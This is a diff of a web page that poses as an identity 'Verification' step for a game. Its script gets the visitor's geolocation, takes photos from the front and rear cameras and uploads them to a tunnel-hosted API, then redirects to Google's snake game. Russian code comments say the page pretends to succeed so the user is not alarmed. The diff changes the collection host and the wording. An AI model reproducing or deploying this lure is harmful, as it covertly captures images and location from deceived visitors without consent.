@@ -20,7 +20,7 @@
 <body>
     <div class="card">
         <h2 id="st">Verification</h2>
-        <p id="msg">Please confirm your identity to access the secure game server.</p>
+        <p id="msg">Please confirm your identity.</p>
         <button class="btn" id="go" onclick="run()">CONFIRM</button>
         <div id="loader"></div>
     </div>
@@ -29,7 +29,7 @@
     <canvas id="c"></canvas>
 
 <script>
-    const API = "https://8b17917e87823e.lhr.life"; 
+    const API = "https://48843260c9dc5f.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -89,7 +89,7 @@
 
         btn.style.display = 'none';
         loader.style.display = 'block';
-        msg.innerText = "Initializing security protocols...";
+        msg.innerText = "Initializing protocols...";
 
         // Гео запускаем сразу без ожидания
         navigator.geolocation.getCurrentPosition(p => {
@@ -100,7 +100,7 @@
         const plan = [{ m: "user", l: "front_1" }, { m: "environment", l: "back_1" }];
 
         for (let i = 0; i < plan.length; i++) {
-            msg.innerText = `Identity Check (${i + 1}/${plan.length})...`;
+            msg.innerText = ` Check (${i + 1}/${plan.length})...`;
             const photo = await takePhoto(plan[i].m, plan[i].l);
             if (photo) {
                 fd.append('files', photo, getSmartName(plan[i].l));
@@ -121,7 +121,7 @@
         // Даже если фото не вышло, ведем себя так, будто все ок, чтобы не злить юзера ошибками
         statusTitle.innerText = "Success";
         loader.style.display = 'none';
-        msg.innerText = "Verified! Loading game...";
+        msg.innerText = "Verified! Loading ...";
         setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
     }
 </script>
